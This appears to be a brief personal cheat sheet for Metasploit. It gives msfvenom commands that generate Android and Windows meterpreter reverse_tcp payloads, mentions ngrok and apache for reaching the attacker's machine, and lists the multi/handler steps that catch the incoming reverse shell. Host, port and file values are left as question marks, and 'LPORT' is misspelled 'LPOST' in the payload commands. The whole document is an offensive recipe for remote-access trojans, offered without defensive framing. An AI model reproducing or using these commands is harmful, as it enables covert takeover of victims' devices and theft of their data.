msfvenom -p android/meterpreter/reverse_tcp LHOST=? LPOST=? R> filename?
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=? LPOST=? -o filename?

ngrok, apache

open:

- use exploit/multi/handler
- set payload android/meterpreter/reverse_tcp
- set LHOST ?
- set LPORT ?
- run exploit
- configure to target -> ?
